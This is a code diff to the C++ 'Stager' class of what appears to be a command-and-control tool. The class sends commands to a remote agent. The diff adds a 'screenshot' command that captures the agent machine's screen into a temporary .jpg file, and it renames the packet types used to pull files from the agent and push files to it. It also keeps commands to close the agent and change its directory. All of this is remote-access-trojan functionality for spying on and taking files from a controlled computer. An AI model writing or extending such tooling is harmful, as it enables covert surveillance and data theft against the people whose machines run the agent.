@@ -16,6 +16,7 @@ void Stager::OnConnect(Connection newConnection)
     std::cout << std::endl;
 }
 
+
 bool Stager::Logic(const std::string& cmd)
 {
     if (cmd == "Quit")
@@ -27,13 +28,30 @@ bool Stager::Logic(const std::string& cmd)
     PacketType packetType = MapPacketType(cmd);
     Packet     packet(packetType);
         
-    // receive file
-    if (packetType == PacketType::Integers)
+    // receive a file because a packet type of FileRequest/Screenshot will be sent 
+    if (packetType == PacketType::FileRequest or packetType == PacketType::Screenshot)
     {
-        std::string filename = cmd.substr(cmd.find(' ') + 1);
+        std::string filename;
+
+        // if we want a screenshot generate a file name.
+        if (packetType == PacketType::Screenshot)
+        {
+            std::string temporary = "sc_XXXXXX";
+            if (::_mktemp_s(const_cast<char*>(temporary.c_str()), temporary.size() + 1) != 0)
+            {
+                std::cerr << "Error at _mktemp_s." << std::endl;
+                return false;
+            }
+
+            filename = temporary + ".jpg";
+        }
+
+        // if we want to download a file, extract the name from the command string
+        else filename = cmd.substr(cmd.find(' ') + 1);
+
         packet.InsertString(filename);
 
-        // send packet with the file name we want to download
+        // send packet with the file name which we want to receive
         if (not clientConn.Send(packet))
         {
             std::cerr << "Error at Send (download pcket)." << std::endl;
@@ -68,7 +86,7 @@ bool Stager::Logic(const std::string& cmd)
     }
 
     // send file
-    else if (packetType == PacketType::Bytes)
+    else if (packetType == PacketType::FileTransmit)
     {
         // check if file exist, if not display error message
         // send the file
@@ -91,7 +109,6 @@ bool Stager::Logic(const std::string& cmd)
         return true;
     }
     
-
     // send connectionClose packet to the agent and return
     if (packetType == PacketType::ConnectionClose)
     {
@@ -122,6 +139,7 @@ bool Stager::Logic(const std::string& cmd)
 	return true;
 }
 
+// map command to packet types
 PacketType Stager::MapPacketType(const std::string& cmd)
 {
     std::string commandType = cmd.substr(0, cmd.find(' '));
@@ -130,15 +148,18 @@ PacketType Stager::MapPacketType(const std::string& cmd)
     if (cmd == "agentdown")
         return PacketType::ConnectionClose;
 
+    else if (cmd == "screenshot")
+        return PacketType::Screenshot;
+
     else if (commandType == "upload")
-        return PacketType::Bytes;
+        return PacketType::FileTransmit;
 
     else if (commandType == "download")
-        return PacketType::Integers;
+        return PacketType::FileRequest;
 
     else if (commandType == "cd" and commandArgs != commandType) // ugly but works
         return PacketType::Pwd;
 
     else 
-        return PacketType::Text;
+        return PacketType::Characters;
 }
